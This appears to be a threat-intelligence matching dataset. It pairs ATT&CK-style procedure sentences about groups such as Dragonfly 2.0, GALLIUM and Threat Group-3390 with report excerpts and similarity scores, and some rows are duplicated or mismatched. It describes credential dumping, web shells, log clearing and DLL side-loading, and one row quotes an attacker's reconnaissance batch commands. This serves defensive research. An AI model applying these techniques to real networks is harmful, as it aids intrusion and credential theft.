"gallium has used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions.","[1].002software packinggalliumpacked some payloads using different types of packers, both known and custom. [1].005indicator removal from toolsgalliumensured each payload had a unique hash, including by using different types of packers.","[1]enterpriset1588.002obtain capabilities:toolgalliumhas used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions.","[2]enterpriset1003.001os credential dumping:lsass memorygalliumused a modified version ofmimikatzalong with a powershell-basedmimikatzto dump credentials on the victim machines. [1][2].002os credential dumping:security account managergalliumusedregcommands to dump specific hives from the windows registry, such as the sam hive, and obtain password hashes.",66f5719d3063d29485700622,4269,0.757570912256571
gallium used wmi for execution to assist in lateral movement as well as for installing tools across multiple assets.,[1]enterpriset1550.002use alternate authentication material:pass the hashgalliumused dumped hashes to authenticate to other machines via pass the hash. [1]enterpriset1078valid accountsgalliumleveraged valid accounts to maintain access to a victim network.,[1]enterpriset1047windows management instrumentationgalliumused wmi for execution to assist in lateral movement as well as for installing tools across multiple assets.,"[1] ■한국 맞춤형 표적공격'작전명 스타 크루저(operation star cruiser)' 배경이스트시큐리티(estsecurity)의cti 전문 조직인시큐리티대응센터(이하 esrc)는 정부 차원의 후원을 받는 것으로 추정되는 공격자(state-sponsored actor)가 수행한 최신 지능형지속위협(apt) 캠페인을 발견했습니다.이 캠페인은 현재 한국 대상의 고도화된 위협 중 가장 왕성하게 활동하고 있으며, esrc에서는 이들이'금성121(geumseong121)위협그룹'과 직·간접적으로 연계된 apt 조직인 라자루스(lazarus) 그룹으로 판단하고 있습니다.이른바'작전명 스타 크루저(operation star cruiser)'로 명명된 이번 캠페인은 hwp 문서파일 취약점을 사용했는데, 지난 2018년 02월부터 03월까지 핵심적으로 수행된'작전명 배틀 크루저(operation battle cruiser)'를 우선 참조해 주시기 바랍니다.이 두개의 유사 오퍼레이션은 하나의 연장선에서 약 2주간의 일정 간격을 두고 진행되었고, 마치 쌍둥이처럼 ttps(tactics/tools, techniques and procedures)의 유사성이 강력히 연결됩니다.또, 공격에 활용된 implants, attribution, infrastructure 등도 같은 패턴과 흐름을 유지하고, 최종 payload 역시 유사 명령제어(c2) 프로토콜을 가지고 있습니다.4월 현재 한국을 겨냥한 '오퍼레이션 스타 크루저'의 공격자는 이전 위협과 거의 유사한 체계를 그대로 활용했습니다.",66f5719d3063d29485700622,4283,0.7756609874123539
gallium exploited a publicly-facing servers including wildfly/jboss servers to gain access to the network.,[1]enterpriset1074.001data staged:local data staginggalliumcompressed and staged files in multi-part archives in the recycle bin prior to exfiltration. [1]enterpriset1041exfiltration over c2 channelgalliumused web shells andhtranfor c2 and to exfiltrate data.,[1]enterpriset1190exploit public-facing applicationgalliumexploited a publicly-facing servers including wildfly/jboss servers to gain access to the network.,"[1][2]enterpriset1133external remote servicesgalliumhas used vpn services, including softether vpn, to access and maintain persistence in victim environments. [1][2]enterpriset1574.002hijack execution flow:dll side-loadinggalliumused dll side-loading to covertly loadpoisonivyinto memory on the victim machine.",66f5719d3063d29485700622,4260,0.7447092315269386
bendybear has used byte randomization to obscure its behavior.,"at 10,000+ bytes, bendybear is noticeably larger than most, and uses its size to implement advanced features and anti-analysis techniques, such as modified rc4 encryption, signature block verification, and polymorphic code.the sample analyzed in this blog was identified by its connections to a malicious c2 domain published bytaiwan's ministry of justice investigation bureauin august 2020. it was discovered absent additional information regarding the exploit vector, potential victims or intended use.palo alto networks customers can be protected from the attacks outlined in this blog with thenext-generation firewallalongsidedns security,url filteringandwildfiresecurity subscriptions, andcortex xdr.a new class of shellcodeat a macro level, bendybear is unique in that it:transmits payloads in modified rc4-encrypted chunks. this hardens the encryption of the network communication, as a single rc4 key will not decrypt the entire payload.attempts to remain hidden from cybersecurity analysis by explicitly checking its environment for signs of debugging.leverages existing windows registry key that is enabled by default in windows 10 to store configuration data.clears the host’s dns cache every time it attempts to connect to its c2 server, thereby requiring that the host resolve the current ip address for the malicious c2 domain each time.generates unique session keys for each connection to the c2 server.obscures its connection protocol by connecting to the c2 server over a common port (443), thereby blending in with normal ssl network traffic.employs polymorphic code, changing its runtime footprint during code execution to thwart memory analysis and evade signaturing.encrypts or decrypts function blocks (code blocks) during runtime, as needed, to evade detection.uses position independent code (pic) to throw off static analysis tools.in the following sections, we provide an in-depth technical breakdown of each of these capabilities.technical detailsshellcode executionthe shellcode (sha256:64cc899ec85f612270fcfb120a4c80d52d78e68b05caf1014d2fe06522f1e2d0) is considered to be a stager, or downloader, whose function is to download an implant from a c2 server.","during execution, the code employs byte randomization to obscure its behavior.","this is achieved by using the host’s current time as a seed for a pseudorandom number generator, and then performing additional operations against that output. the resulting values are used to overwrite blocks of previously executed code.",66f572be3063d294857006cf,4326,0.7097132574842433
"threat group-3390 has used dll side-loading, including by using legitimate kaspersky antivirus variants in which the dll acts as a stub loader that loads and executes the shell code.","enabling these features gives the threat actor a remote control channel to persistently access the victim's environment without using malicious software that could be detected.figure 3. powershell commands. (source: secureworks)some payloads leveraged dll side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious dll.","the dll acts as a stub loader, which loads and executes shell code.","bronze union previously used this technique to enable execution of plugx and httpbrowser tools in a way that is challenging for network defenders to detect.in 2016, ctu researchers observed the group using native system functionality to disable logging processes and delete logs within a compromised environment. the threat actors used theappcmdcommand-line tool to unlock and disable the default logging component on the server (systsm.webserver/httplogging) and then delete existing logs from the system (see figure 4).figure 4. threat actor using appcmd to delete logs and disable logging.",66f573083063d294857006fc,1289,0.7088410931130777
"ramsay has been embedded in documents exploiting cve-2017-0199, cve-2017-11882, and cve-2017-8570.","notably, documents created with this builder use the cmstp bypass as described in [2]. both palo alto networks [3] and quoscient [4] have previously described documents created with this kit.venomkitwe use this name to describe documents generated by a builder purchased from the same seller as taurus builder.","depending on the variant it may exploit cve-2017-0199, cve-2017-8570, cve-2017-8759, cve-2017-11882, cve-2018-0802, and/or cve-2018-8174.","notably, venomkit often also uses the same cmstp bypass as taurus. documents from this kit have previously been discussed by quoscient [4].more_eggsmore_eggs is malware written in jscript used in these campaigns and others.",66f573ca3063d29485700766,4425,0.7831855005433126
"the group has previously exploited cve-2017-8570, cve-2012-1856, cve-2014-4114, cve-2017-0199, cve-2017-11882, and cve-2015-1641.","notably, documents created with this builder use the cmstp bypass as described in [2]. both palo alto networks [3] and quoscient [4] have previously described documents created with this kit.venomkitwe use this name to describe documents generated by a builder purchased from the same seller as taurus builder.","depending on the variant it may exploit cve-2017-0199, cve-2017-8570, cve-2017-8759, cve-2017-11882, cve-2018-0802, and/or cve-2018-8174.","notably, venomkit often also uses the same cmstp bypass as taurus. documents from this kit have previously been discussed by quoscient [4].more_eggsmore_eggs is malware written in jscript used in these campaigns and others.",66f573ca3063d29485700766,4425,0.7810779617574208
"leviathan has exploited multiple microsoft office and .net vulnerabilities for execution, including cve-2017-0199, cve-2017-8759, and cve-2017-11882.","notably, documents created with this builder use the cmstp bypass as described in [2]. both palo alto networks [3] and quoscient [4] have previously described documents created with this kit.venomkitwe use this name to describe documents generated by a builder purchased from the same seller as taurus builder.","depending on the variant it may exploit cve-2017-0199, cve-2017-8570, cve-2017-8759, cve-2017-11882, cve-2018-0802, and/or cve-2018-8174.","notably, venomkit often also uses the same cmstp bypass as taurus. documents from this kit have previously been discussed by quoscient [4].more_eggsmore_eggs is malware written in jscript used in these campaigns and others.",66f573ca3063d29485700766,4425,0.7468297820968485
this is most likely meant to be a mechanism to update the compromised host with a new version of the lowball malware.,"it uses the dropbox api with a hardcoded bearer access token and has the ability to download, upload, and execute files. the communication occurs via https over port 443.after execution, the malware will use the dropbox api to make an http get request using https over tcp port 443 for the files:md5filenamed76261ba3b624933a6ebb5dd73758db4wmiapcom79b68cdd0044edd4fbf8067b22878644wmiapcom.batthe “wmiapcom.bat” file is simply used to start “wmiapcom”, which happens to be the exact same file as the one dropped by the malicious word documents.","however, this is most likely meant to be a mechanism to update the compromised host with a new version of the lowball malware.the threat group monitors its dropbox account for responses from compromised computers.","once the lowball malware calls back to the dropbox account, the attackers will create a file called “[computer_name]_upload.bat” which contains commands to be executed on the compromised computer. this batch file is then executed on the target computer, with the results uploaded to the attackers’ dropbox account in a file named “[computer_name]_download”.we observed the threat group issue the following commands:@echo offdir c:\\\\ >> %temp%\\\\downloadipconfig /all >> %temp%\\\\downloadnet user >> %temp%\\\\downloadnet user /domain >> %temp%\\\\downloadver >> %temp%\\\\downloaddel %0@echo offdir ""c:\\\\documents and settings"" >> %temp%\\\\downloaddir ""c:\\\\program files\\\\"" >> %temp%\\\\downloadnet start >> %temp%\\\\downloadnet localgroup administrator >> %temp%\\\\downloadnetstat -ano >> %temp%\\\\downloadthese commands allow the threat group to gain information about the compromised computer and the network to which it belongs.",66f573453063d2948570071f,2264,0.7540025223413854
kazuar is obfuscated using the open source confuserex protector.,"attackers making use of the free malware could also be getting shortchanged on the “free” offer: as our analysis reveals, the malware authors maintain access to all data stolen by their clients, and they could well be profiting from it in addition to, or even in advance of, their clientele. not so “free,” after all.operating systemrisk & impacttechnical analysiszingostealer is delivered as a highly obfuscated .net executable.","the initial file is obfuscated using confuserex, an open-source protector tool for .net files.","the file is decrypted on the fly using the type initializer "".cctor,"" which causes error messages when attempting to use automatic deobfuscation tools. this makes readable code more difficult to obtain, providing the attacker with a means of impeding analysis.figure 1  – obfuscated .net zingostealer executablewhen executed, the first thing the malware does is reach out to its c2 server to retrieve a list of dependencies (also shown in figure 2).",66f573863063d2948570073d,3030,0.7684254060847739
"threat group-3390 actors use at to schedule tasks to run self-extracting rar archives, which install httpbrowser or plugx on other victims on a network.","tg-3390 actors favor at.exe to create scheduled tasks for executing commands on remote systems.figure 12. nbtscan batch script (renamed ipcan.exe) used to profile network. (source: dell secureworks)over a few days' span, the threat actors install remote access tools on additional systems based upon the results of the network reconnaissance.","they use at.exe to schedule tasks to run self-extracting rar archives, which install either httpbrowser or plugx.","ctu researchers observed the threat actors collecting cisco vpn profiles to use when accessing the victim's network via vpn (see figure 13).figure 13. copying of .pcf files. (source: dell secureworks)to facilitate lateral movement, the adversaries deploy aspxtool web shells to internally accessible systems running iis.ctu researchers have observed the threat actors encrypting data using the password ""admin-windows2014"" and splitting the rar archives into parts in the recycler directory, with the same name as the uncompressed data (see figure 14).figure 14. batch script used to archive data.",66f574483063d294857007aa,1983,0.8015572291731203
"dragonfly 2.0 cleared windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs.",[15]enterpriset1562.004impair defenses:disable or modify system firewalldragonflyhas disabled host-based firewalls. the group has also globally opened port 3389.,"[15]enterpriset1070.001indicator removal:clear windows event logsdragonflyhas cleared windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs.","the actors also deleted specific registry keys. [15].004indicator removal:file deletiondragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.",66f574df3063d294857007fc,4297,0.791524525346079
the actors also deleted specific registry keys.,"the group has also globally opened port 3389. [15]enterpriset1070.001indicator removal:clear windows event logsdragonflyhas cleared windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs.",the actors also deleted specific registry keys.,"[15].004indicator removal:file deletiondragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots. [15]enterpriset1105ingress tool transferdragonflyhas copied and installed tools for operations once in the victim environment.",66f574df3063d294857007fc,4298,1.0
"threat group-3390 has used dll side-loading, including by using legitimate kaspersky antivirus variants in which the dll acts as a stub loader that loads and executes the shell code.","hunter queried the following uris in a specific order to determine if the associated software configurations are insecure, and all queries contained the httpclient user-agent:get /manager/html/ — tomcat web application managerget /jmx-console/ — jboss configurationget /cfide/administrator/login.cfm — coldfusion configurationinstallationtg-3390 uses dll side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious dll. ctu researchers have observed the threat actors employing legitimate kaspersky antivirus variants in analyzed samples.","the dll acts as a stub loader, which loads and executes the shell code.",the adversaries have used this technique to allow plugx and httpbrowser to persist on a system.note: dll side loading is a prevalent persistence technique that is used to launch a multitude of backdoors. the challenge is detecting known good software loading and running malware.,66f574483063d294857007aa,1965,0.7140501405800413
the group has also globally opened port 3389.,[7]enterpriset1564.002hide artifacts:hidden usersdragonflyhas modified the registry to hide created user accounts. [15]enterpriset1562.004impair defenses:disable or modify system firewalldragonflyhas disabled host-based firewalls.,the group has also globally opened port 3389.,"[15]enterpriset1070.001indicator removal:clear windows event logsdragonflyhas cleared windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. the actors also deleted specific registry keys.",66f574df3063d294857007fc,4296,1.0000000000000002
"hafnium has exploited cve-2021-26855, cve-2021-26857, cve-2021-26858, and cve-2021-27065  to compromise on-premises versions of microsoft exchange server, enabling access to email accounts and installation of additional malware.","there is a check in the batch-requests plugin which overrides the client ip with its real remote ip. but due to a bug in the code, this check can be bypassed.recommended mitigationsin affected versions of apache apisix, you can avoid this risk by explicitly commenting out batch-requests in the conf/config.yaml and conf/config-default.yaml files and restarting apache apisix.update to 2.10.4 or 2.12.1.detection methodsn/avulnerable technologies and versionsapache apisix between 1.3 and 2.12.1 (excluding 2.12.1)lts versions of apache apisix between 2.10.0 and 2.10.4table xvii: zoho cve-2021-40539zoho cve-2021-40539 cvss 3.0: 9.8 (critical)vulnerability descriptionzoho manageengine adselfservice plus version 6113 and prior is vulnerable to rest api authentication bypass with resultant remote code execution.recommended mitigationsupgrade to latest version.detection methodsrun manageengine’s detection tool.check for specific files andlogs.vulnerable technologies and versionszoho corp manageengine adselfservice plustable xviii: microsoft cve-2021-26857microsoft cve-2021-26857 cvss 3.0: 7.8 (high)vulnerability descriptionmicrosoft exchange server remote code execution vulnerability.","this cve id differs from cve-2021-26412, cve-2021-26854, cve-2021-26855, cve-2021-26858, cve-2021-27065, and cve-2021-27078.recommended mitigationsupdate to support latest version.install microsoft security patch.use microsoft exchange on-premises mitigation tool.detection methodsrun exchange script: https://github.com/microsoft/css-exchange/tree/main/security.hashes can be found here: https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/#scan-log.vulnerable technologies and versionsmicrosoft exchange serverstable xix: microsoft cve-2021-26858table xx: microsoft cve-2021-27065table xxi: apache cve-2021-41773apache cve-2021-41773 cvss 3.0: 7.5 (high)vulnerability descriptionthis vulnerability has been modified since it was last analyzed by nvd.","it is awaiting reanalysis, which may result in further changes to the information provided. a flaw was found in a change made to path normalization in apache http server 2.4.49. a malicious actor could use a path traversal attack to map urls to files outside the directories configured by alias-like directives.",66f574d13063d294857007f1,4098,0.7105978176339874
"dragonfly 2.0 deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.","[15]enterpriset1070.001indicator removal:clear windows event logsdragonflyhas cleared windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. the actors also deleted specific registry keys.","[15].004indicator removal:file deletiondragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.",[15]enterpriset1105ingress tool transferdragonflyhas copied and installed tools for operations once in the victim environment. [15]enterpriset1036masqueradingdragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account.,66f574df3063d294857007fc,4299,0.7418720166376422
dragonfly 2.0 has gathered hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[8]enterpriset1133external remote servicesdragonflyhas used vpns and outlook web access (owa) to maintain access to victim networks. [15][8]enterpriset1083file and directory discoverydragonflyhas used a batch script to gather folder and file names from victim hosts.,[15][7][8]enterpriset1187forced authenticationdragonflyhas gathered hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[15][7]enterpriset1591.002gather victim org information:business relationshipsdragonflyhas collected open source information to identify relationships between organizations for targeting purposes. [7]enterpriset1564.002hide artifacts:hidden usersdragonflyhas modified the registry to hide created user accounts.,66f574df3063d294857007fc,4292,0.8479097466636698
dragonfly has performed forced authentication to gather hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[8]enterpriset1133external remote servicesdragonflyhas used vpns and outlook web access (owa) to maintain access to victim networks. [15][8]enterpriset1083file and directory discoverydragonflyhas used a batch script to gather folder and file names from victim hosts.,[15][7][8]enterpriset1187forced authenticationdragonflyhas gathered hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[15][7]enterpriset1591.002gather victim org information:business relationshipsdragonflyhas collected open source information to identify relationships between organizations for targeting purposes. [7]enterpriset1564.002hide artifacts:hidden usersdragonflyhas modified the registry to hide created user accounts.,66f574df3063d294857007fc,4292,0.7491349485679597
"dragonfly 2.0 created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.",the group was observed installing python 2.7 on a victim. [15]enterpriset1584.004compromise infrastructure:serverdragonflyhas compromised legitimate websites to host c2 and malware modules.,"[7]enterpriset1136.001create account:local accountdragonflyhas created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.","[15]enterpriset1005data from local systemdragonflyhas collected data from local victim systems. [15]enterpriset1074.001data staged:local data stagingdragonflyhas created a directory named ""out"" in the user's %appdata% folder and copied files to it.",66f574df3063d294857007fc,4282,0.760446675883364
dragonfly 2.0 created accounts disguised as legitimate backup and service accounts as well as an email administration account.,"[15].004indicator removal:file deletiondragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots. [15]enterpriset1105ingress tool transferdragonflyhas copied and installed tools for operations once in the victim environment.",[15]enterpriset1036masqueradingdragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account.,"[15]enterpriset1112modify registrydragonflyhas modified the registry to perform multiple techniques through the use ofreg. [15]enterpriset1135network share discoverydragonflyhas identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ics or supervisory control and data acquisition (scada) systems.",66f574df3063d294857007fc,4301,0.8400771392822858
"owaauth uses the filename owaauth.dll, which is a legitimate file that normally resides in %programfiles%\\microsoft\\exchange server\\clientaccess\\owa\\auth\\; the malicious file by the same name is saved in %programfiles%\\microsoft\\exchange server\\clientaccess\\owa\\bin\\.","(source: dell secureworks)appendix c — owaauth web shell analysisowaauth is a web shell that is installed as an isapi filter on exchange servers and shares characteristics with the chinachopper web shell. like chinachopper, it parses http requests for the z1 and z2 parameters (see table 4).",the legitimate owaauth.dll file resides in %programfiles%\\\\microsoft\\\\exchange server\\\\clientaccess\\\\owa\\\\auth\\\\ while ctu researchers have observed the backdoor using the same filename in the %programfiles%\\\\microsoft\\\\exchange server\\\\clientaccess\\\\owa\\\\bin\\\\ directory.,"in addition to acting as a web shell, the malware captures and des-encrypts credentials before writing the username and password to disk. the owaauth web shell enables a threat actor to upload and download files, launch processes, and execute sql queries.each web shell instance is configured to contain sp, key, and log variables.",66f574483063d294857007aa,2028,0.8687430321319289
they also obtained ntds.dit from domain controllers.,[4]enterpriset1003.002os credential dumping:security account managerdragonflyhas dropped and executed secretsdump to dump password hashes. [15].003os credential dumping:ntdsdragonflyhas dropped and executed secretsdump to dump password hashes.,they also obtained ntds.dit from domain controllers.,[15][17].004os credential dumping:lsa secretsdragonflyhas dropped and executed secretsdump to dump password hashes. [15][17]enterpriset1069.002permission groups discovery:domain groupsdragonflyhas used batch scripts to enumerate administrators and users in the domain.,66f574df3063d294857007fc,4307,1.0000000000000002
"dragonfly 2.0 identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ics or supervisory control and data acquisition  systems.",[15]enterpriset1036masqueradingdragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account. [15]enterpriset1112modify registrydragonflyhas modified the registry to perform multiple techniques through the use ofreg.,"[15]enterpriset1135network share discoverydragonflyhas identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ics or supervisory control and data acquisition (scada) systems.","[15]enterpriset1588.002obtain capabilities:tooldragonflyhas obtained and used tools such asmimikatz,crackmapexec, andpsexec. [4]enterpriset1003.002os credential dumping:security account managerdragonflyhas dropped and executed secretsdump to dump password hashes.",66f574df3063d294857007fc,4303,0.790093487882195
"dragonfly identified and browsed file servers on the victim network, viewing files pertaining to ics or supervisory control and data acquisition  systems.",[15]enterpriset1036masqueradingdragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account. [15]enterpriset1112modify registrydragonflyhas modified the registry to perform multiple techniques through the use ofreg.,"[15]enterpriset1135network share discoverydragonflyhas identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ics or supervisory control and data acquisition (scada) systems.","[15]enterpriset1588.002obtain capabilities:tooldragonflyhas obtained and used tools such asmimikatz,crackmapexec, andpsexec. [4]enterpriset1003.002os credential dumping:security account managerdragonflyhas dropped and executed secretsdump to dump password hashes.",66f574df3063d294857007fc,4303,0.7508340516537171
httpbrowser's code may be obfuscated through structured exception handling and return-oriented programming.,the malware can be configured to use multiple network protocols to avoid network-based detection. dll side loading is often used to maintain persistence on the compromised system.httpbrowser (also known as tokencontrol) — a backdoor notable for https communications with the httpbrowser/1.0 user-agent (see figure 3).,httpbrowser's executable code may be obfuscated through structured exception handling and return-oriented programming.,"its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes. antivirus detection for httpbrowser is extremely low and is typically based upon heuristic signatures.",66f574483063d294857007aa,1935,0.9757278898501893
ursnif has used a peer-to-peer  network for c2.,"(source: dell secureworks)lastly, we examined how well connected the waledac/kelihos peer-to-peer network was by analyzing each node's peers list. because each node maintains a list of up to 250 other peers, the network organizes itself almost into a single cluster.",figure 5 shows how the peer-to-peer network appeared at the start of our sinkhole.figure 5. the peer-to-peer network graph.,the edges between nodes indicate a link between two nodes based on their peer lists. (source: dell secureworks)botnet protection recommendationsthe ctu research team recommends that businesses continue to educate employees on botnet protection and enforce policies to keep the software on systems up to date.,66f574c03063d294857007ea,3836,0.7165080280207271
"dragonfly 2.0 used various types of scripting to perform operations, including python scripts.","[15].001powershelldragonflyhas used powershell scripts for execution. [15][5].003windows command shelldragonflyhas used various types of scripting to perform operations, including batch scripts.","[15].006pythondragonflyhas used various types of scripting to perform operations, including python scripts.",the group was observed installing python 2.7 on a victim. [15]enterpriset1584.004compromise infrastructure:serverdragonflyhas compromised legitimate websites to host c2 and malware modules.,66f574df3063d294857007fc,4279,0.7506622660198202
the group was observed installing python 2.7 on a victim.,"[15][5].003windows command shelldragonflyhas used various types of scripting to perform operations, including batch scripts. [15].006pythondragonflyhas used various types of scripting to perform operations, including python scripts.",the group was observed installing python 2.7 on a victim.,"[15]enterpriset1584.004compromise infrastructure:serverdragonflyhas compromised legitimate websites to host c2 and malware modules. [7]enterpriset1136.001create account:local accountdragonflyhas created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.",66f574df3063d294857007fc,4280,1.0000000000000002
dragonfly 2.0 used spearphishing with pdf attachments containing malicious links that redirected to credential harvesting websites.,[15]enterpriset1566.001phishing:spearphishing attachmentdragonflyhas sent emails with malicious attachments to gain initial access. [7]enterpriset1598.002phishing for information:spearphishing attachmentdragonflyhas used spearphishing with microsoft office attachments to enable harvesting of user credentials.,[15].003phishing for information:spearphishing linkdragonflyhas used spearphishing with pdf attachments containing malicious links that redirected to credential harvesting websites.,[15]enterpriset1012query registrydragonflyhas queried the registry to identify victim information. [15]enterpriset1021.001remote services:remote desktop protocoldragonflyhas moved laterally via rdp.,66f574df3063d294857007fc,4312,0.7399066719676272
spark has checked the results of the getkeyboardlayoutlist and the language name returned by getlocaleinfoa to make sure they contain the word “arabic” before executing.,"figure 5 shows the splash image displayed by the enigma protector prior to executing the malicious payload, which is a wallpaper imageavailable at wallpaperswide.com. the splash screen feature acts as a sandbox evasion technique, as it requires user interaction in the form of clicking the screen before the malicious code runs.figure 5. screenshot of the contents of the malicious pdf documentonce unpacked, we found the spark payload was similar to the payloads delivered in operation parliament from a capability perspective.","the spark payload is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system.the payload starts by checking the results of the getkeyboardlayoutlist and the language name returned by getlocaleinfoa to make sure they contain the word ""arabic"".","if the word is not found in the results of these two api calls, the payload does not execute any of its malicious code. checking for specific keyboards and languages is a known evasion tactic meant to avoid running on analysis systems not configured, as the actor’s targeted victim would be configured.after the payload confirms that the system has the appropriate keyboard and language pack installed for the actor’s desired target, it will begin attempting to communicate with a c2 server specified within a configuration embedded within the payload.",66f574213063d29485700794,1167,0.716559035622091
"dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",[15]enterpriset1608.004stage capabilities:drive-by targetdragonflyhas compromised websites to redirect traffic and to host exploit kits. [7]enterpriset1195.002supply chain compromise:compromise software supply chaindragonflyhas placed trojanized installers for control system software on legitimate vendor app stores.,"[4][7]enterpriset1016system network configuration discoverydragonflyhas used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",[15]enterpriset1033system owner/user discoverydragonflyused the commandquery useron victim hosts. [15]enterpriset1221template injectiondragonflyhas injected smb urls into malicious word spearphishing attachments to initiateforced authentication.,66f574df3063d294857007fc,4321,0.7590626879228197
"dragonfly 2.0 commonly created web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.","[15]enterpriset1053.005scheduled task/job:scheduled taskdragonflyhas used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files. [15]enterpriset1113screen capturedragonflyhas performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of screenutil).","[15][5][7]enterpriset1505.003server software component:web shelldragonflyhas commonly created web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.",[15]enterpriset1608.004stage capabilities:drive-by targetdragonflyhas compromised websites to redirect traffic and to host exploit kits. [7]enterpriset1195.002supply chain compromise:compromise software supply chaindragonflyhas placed trojanized installers for control system software on legitimate vendor app stores.,66f574df3063d294857007fc,4318,0.7587649302429362
dragonfly 2.0 has gathered hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[8]enterpriset1133external remote servicesdragonflyhas used vpns and outlook web access (owa) to maintain access to victim networks. [15][8]enterpriset1083file and directory discoverydragonflyhas used a batch script to gather folder and file names from victim hosts.,[15][7][8]enterpriset1187forced authenticationdragonflyhas gathered hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[15][7]enterpriset1591.002gather victim org information:business relationshipsdragonflyhas collected open source information to identify relationships between organizations for targeting purposes. [7]enterpriset1564.002hide artifacts:hidden usersdragonflyhas modified the registry to hide created user accounts.,66f574df3063d294857007fc,4292,0.8479097466636698
dragonfly 2.0 created accounts disguised as legitimate backup and service accounts as well as an email administration account.,"[15].004indicator removal:file deletiondragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots. [15]enterpriset1105ingress tool transferdragonflyhas copied and installed tools for operations once in the victim environment.",[15]enterpriset1036masqueradingdragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account.,"[15]enterpriset1112modify registrydragonflyhas modified the registry to perform multiple techniques through the use ofreg. [15]enterpriset1135network share discoverydragonflyhas identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ics or supervisory control and data acquisition (scada) systems.",66f574df3063d294857007fc,4301,0.8400771392822858
"owaauth uses the filename owaauth.dll, which is a legitimate file that normally resides in %programfiles%\\microsoft\\exchange server\\clientaccess\\owa\\auth\\; the malicious file by the same name is saved in %programfiles%\\microsoft\\exchange server\\clientaccess\\owa\\bin\\.","(source: dell secureworks)appendix c — owaauth web shell analysisowaauth is a web shell that is installed as an isapi filter on exchange servers and shares characteristics with the chinachopper web shell. like chinachopper, it parses http requests for the z1 and z2 parameters (see table 4).",the legitimate owaauth.dll file resides in %programfiles%\\\\microsoft\\\\exchange server\\\\clientaccess\\\\owa\\\\auth\\\\ while ctu researchers have observed the backdoor using the same filename in the %programfiles%\\\\microsoft\\\\exchange server\\\\clientaccess\\\\owa\\\\bin\\\\ directory.,"in addition to acting as a web shell, the malware captures and des-encrypts credentials before writing the username and password to disk. the owaauth web shell enables a threat actor to upload and download files, launch processes, and execute sql queries.each web shell instance is configured to contain sp, key, and log variables.",66f574483063d294857007aa,2028,0.8687430321319289
spark has checked the results of the getkeyboardlayoutlist and the language name returned by getlocaleinfoa to make sure they contain the word “arabic” before executing.,"figure 5 shows the splash image displayed by the enigma protector prior to executing the malicious payload, which is a wallpaper imageavailable at wallpaperswide.com. the splash screen feature acts as a sandbox evasion technique, as it requires user interaction in the form of clicking the screen before the malicious code runs.figure 5. screenshot of the contents of the malicious pdf documentonce unpacked, we found the spark payload was similar to the payloads delivered in operation parliament from a capability perspective.","the spark payload is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system.the payload starts by checking the results of the getkeyboardlayoutlist and the language name returned by getlocaleinfoa to make sure they contain the word ""arabic"".","if the word is not found in the results of these two api calls, the payload does not execute any of its malicious code. checking for specific keyboards and languages is a known evasion tactic meant to avoid running on analysis systems not configured, as the actor’s targeted victim would be configured.after the payload confirms that the system has the appropriate keyboard and language pack installed for the actor’s desired target, it will begin attempting to communicate with a c2 server specified within a configuration embedded within the payload.",66f574213063d29485700794,1167,0.716559035622091
"dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",[15]enterpriset1608.004stage capabilities:drive-by targetdragonflyhas compromised websites to redirect traffic and to host exploit kits. [7]enterpriset1195.002supply chain compromise:compromise software supply chaindragonflyhas placed trojanized installers for control system software on legitimate vendor app stores.,"[4][7]enterpriset1016system network configuration discoverydragonflyhas used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",[15]enterpriset1033system owner/user discoverydragonflyused the commandquery useron victim hosts. [15]enterpriset1221template injectiondragonflyhas injected smb urls into malicious word spearphishing attachments to initiateforced authentication.,66f574df3063d294857007fc,4321,0.7590626879228197
